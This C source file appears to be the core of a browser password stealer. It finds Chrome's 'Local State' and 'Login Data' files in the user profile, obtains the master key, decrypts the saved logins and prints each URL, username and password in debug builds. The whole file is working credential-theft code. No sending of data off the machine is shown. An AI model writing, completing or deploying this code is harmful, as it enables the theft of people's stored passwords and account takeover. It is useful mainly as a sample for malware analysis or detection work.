#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#include "chromium.h"
#include "jansson/jansson.h"

static char* UserProfile;
static char* PathFormat = "%s\\%s\x00";

// No (backslash/slash) before path
char* pathFromUserProfile(const char* path)
{
    UserProfile = getenv("USERPROFILE");
    char* result = calloc(strlen(UserProfile) + strlen(path) + 2, sizeof(char));
    sprintf(result, PathFormat, UserProfile, path);
    return result;
}

credList* dumpChromium(Browser *browser) {
    unsigned char* key = getMasterKey(browser);

    if(key == NULL)
    {
#ifdef DEBUG
        fprintf(stderr, "Error While Getting Master Key\n");
#endif
        return NULL;
    }

    credList* Credentials = getCredentials(browser, key);
    return Credentials;
}

int main() {
    Browser browsers[] = {
        initBrowser(pathFromUserProfile("AppData\\Local\\Google\\Chrome\\User Data\\Local State"),
                    pathFromUserProfile("AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"), 
                    "Chrome"),
    };

    for(register int j = 0; j < sizeof(browsers)/sizeof(browsers[0]); j++)
    {
        credList* Credentials = dumpChromium(&browsers[j]);

        for(register int i = 0; i < Credentials->size; i++)
        {

#ifdef DEBUG
            printf("URL: %s\n", Credentials->creds[i].url);
            printf("Username: %s\n", Credentials->creds[i].username);
            printf("Password: %s\n", Credentials->creds[i].password);
            printf("----------\n");
#endif

            free(Credentials->creds[i].url);
            free(Credentials->creds[i].username);
            free(Credentials->creds[i].password);
        }

        free(Credentials->creds);
        free(Credentials);
    }

    return 0;
}
